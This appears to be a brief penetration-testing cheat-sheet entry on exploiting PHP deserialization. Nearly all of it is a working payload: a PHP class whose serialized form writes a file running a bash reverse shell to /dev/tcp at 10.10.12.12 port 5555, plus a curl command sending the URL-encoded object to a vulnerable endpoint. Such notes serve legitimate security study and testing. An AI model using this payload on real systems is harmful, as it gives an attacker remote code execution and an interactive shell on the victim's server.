# PHP deserialization



```text
class Example2 {
  public $user_file = 'exploit.php';
  public $data = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/10.10.12.12/5555 0>&1\'"); ?>';
}
print urlencode(serialize(new Example2));
```

Running above snippet in interactive php shell `php -a` would generate payload \(URL encoded variable\) that can be passed as GET variable.

e.g: 

```text
curl -i http://my.rce.domain/vuln.php?args=O%3A14abovegeneratedVaRiAbLe
```

More about [PHP Object Injection](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection), [PHP Deserialization](https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a).



